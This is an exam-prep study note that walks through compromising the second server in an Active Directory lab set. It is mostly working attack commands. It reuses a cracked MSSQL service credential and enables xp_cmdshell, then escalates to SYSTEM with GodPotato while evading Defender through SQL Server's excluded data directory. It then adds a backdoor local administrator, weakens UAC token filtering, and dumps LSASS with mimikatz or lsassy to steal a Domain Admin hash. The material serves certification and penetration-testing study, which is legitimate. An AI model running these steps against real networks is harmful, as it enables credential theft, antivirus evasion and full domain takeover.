# 🎯 MS02 — Exam Solve Guide (Lateral)

> The **second AD box** — usually a SQL/support server reached only through the MS01 pivot. Pattern: reuse the cracked service cred → command exec → local SYSTEM via token abuse → harvest a **Domain Admin** credential cached on the box. Values are placeholders.

Part of [[Active Directory]] · [[AD Attack Framework]]. Prev: [[MS01 — Exam Solve Guide (Foothold)|MS01]] · next: [[DC01 — Exam Solve Guide (Domain)|DC01]] · overview: [[Exam AD Set — Solve Overview]].

```bash
export IP=<MS02_IP> DOMAIN=<domain.tld> DC=<DC_IP>
# reachable through the MS01 ligolo route; often NO reverse route → use the forward (MSSQL/SMB) channel
```

## 1. Access — reuse the service cred
```bash
nxc mssql $IP -u <svc_acct> -p '<cracked_pass>'                     # (Pwn3d!) = you're in
impacket-mssqlclient $DOMAIN/<svc_acct>:'<cracked_pass>'@$IP -windows-auth
```
```sql
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami /priv'       -- expect: nt service\mssql... + SeImpersonatePrivilege Enabled
```
(No MSSQL? reuse the cred/hash over [[WinRM]] or SMB [[Pass-the-Hash]] instead.)

## 2. PrivEsc — SeImpersonate → SYSTEM (Defender-aware)
```sql
-- GodPotato again; but Defender is often ON + tamper-protected here.
-- Trick that works: SQL Server auto-excludes its own DATA dir from Defender.
SELECT physical_name FROM sys.master_files WHERE database_id=1;   -- gives the excluded dir
-- base64-upload the binary into that dir over the MSSQL session, certutil -decode, run via 8.3 short path:
xp_cmdshell C:\PROGRA~1\MICROS~3\MSSQL1~1.SQL\MSSQL\DATA\g.exe -cmd "cmd /c whoami"   -- nt authority\system
```
([[Token Privileges & Potato]]) A `C:\Users\Administrator.<DOMAIN>` profile = **the DA has logged on here → DA creds are in LSASS**.

## 3. Harvest the Domain Admin credential
Two reliable routes — pick by what Defender allows:
```powershell
# (a) direct, if execution isn't blocked:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
```bash
# (b) mimikatz blocked on exec → create a local admin as SYSTEM, flip the token policy, dump LSASS REMOTELY:
#   net user <adm> <pw> /add ; net localgroup Administrators <adm> /add
#   reg add ...\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
nxc smb $IP -u <adm> -p '<pw>' --local-auth -M lsassy        # pulls cached DOMAIN\Administrator NTLM
```
([[Dumping Windows Hashes]]) Result: **DA username + NTLM hash** — no cracking needed.

## ➡️ Handoff
Take the **DA hash** to [[DC01 — Exam Solve Guide (Domain)]] (PtH → DCSync). MS02 is often a *support* box with **no proof.txt** — the graded flag is on the DC.

## 🔑 Exam reminders
- **No reverse route** off MS02 is normal → upload over the existing forward channel (MSSQL `upload`/base64 + `certutil`), don't fish for a reverse shell.
- Defender blocks GodPotato/mimikatz on *write/exec* → use the **SQL excluded dir** and **remote lsassy**.
- Non-builtin local admins are UAC token-filtered over SMB → set `LocalAccountTokenFilterPolicy=1` first.
- Before leaving: confirm a DA credential is actually in hand — that's the whole point of MS02.
